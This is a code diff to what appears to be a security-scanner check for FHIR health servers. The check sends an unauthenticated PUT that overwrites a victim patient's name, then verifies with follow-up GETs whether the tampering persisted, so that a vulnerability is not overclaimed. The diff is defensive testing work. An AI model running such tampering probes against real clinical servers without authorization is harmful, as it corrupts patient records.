@@ -48,15 +48,59 @@ public class UnauthorizedWriteIdTamperingAttack extends AbstractAccessControlAtt
 
         String idVictim = victimPatient.id();
         String token = safeToken();
+        String marker = "Tampered-" + token;
         String payload = "{"
                 + "\"resourceType\":\"Patient\","
                 + "\"id\":\"" + escapeJson(idVictim) + "\","
-                + "\"name\":[{\"given\":[\"Tampered-" + token + "\"],\"family\":\"TamperedFamily-" + token + "\"}]"
+                + "\"name\":[{\"given\":[\"" + escapeJson(marker) + "\"],\"family\":\"TamperedFamily-" + token + "\"}]"
                 + "}";
 
         String url = base + "/Patient/" + idVictim;
+        AttackHttpClient.HttpResult before = httpClient.get(url);
         AttackHttpClient.HttpResult putResult = httpClient.put(url, payload);
-        return AttackOutcome.anonymousWrite(putResult.statusCode(), putResult.responseBody(), oauthAdvertised);
+        AttackResult putOutcome = AttackOutcome.anonymousWrite(putResult.statusCode(), putResult.responseBody(), oauthAdvertised);
+
+        // Deep check: verify whether the tampering actually persisted.
+        AttackHttpClient.HttpResult after = httpClient.get(url);
+        boolean persisted = BehavioralProbeUtils.containsIgnoreCase(after.responseBody(), marker);
+
+        String combinedBody = ""
+                + "GET /Patient/{id} before PUT (HTTP " + before.statusCode() + "):\n"
+                + AuthProbeUtils.truncate(before.responseBody(), 800)
+                + "\n\nPUT /Patient/{id} (HTTP " + putResult.statusCode() + "):\n"
+                + AuthProbeUtils.truncate(putResult.responseBody(), 800)
+                + "\n\nGET /Patient/{id} after PUT (HTTP " + after.statusCode() + "):\n"
+                + AuthProbeUtils.truncate(after.responseBody(), 1200);
+
+        if (putOutcome.classification() == AttackClassification.VULNERABLE) {
+            if (persisted) {
+                return new AttackResult(
+                        putOutcome.statusCode(),
+                        combinedBody,
+                        putOutcome.classification(),
+                        putOutcome.reason() + " Verified persistence of tampered marker in follow-up GET.",
+                        putOutcome.severity()
+                );
+            }
+            // PUT returned success, but the expected modification is not visible. Avoid overclaiming vulnerability.
+            return AttackOutcome.inconclusive(
+                    putResult.statusCode(),
+                    combinedBody,
+                    "PUT returned success but follow-up GET did not show the tampered marker (may be sanitized, ignored, or delayed)."
+            );
+        }
+
+        // For OPEN_POLICY / SECURE outcomes, still enrich with verification info.
+        String extra = persisted
+                ? " Follow-up GET shows tampered marker persisted."
+                : " Follow-up GET does not show tampered marker.";
+        return new AttackResult(
+                putOutcome.statusCode(),
+                combinedBody,
+                putOutcome.classification(),
+                putOutcome.reason() + extra,
+                putOutcome.severity()
+        );
     }
 
     private AttackResult runOwnerReferenceObservation(FhirServer server) {
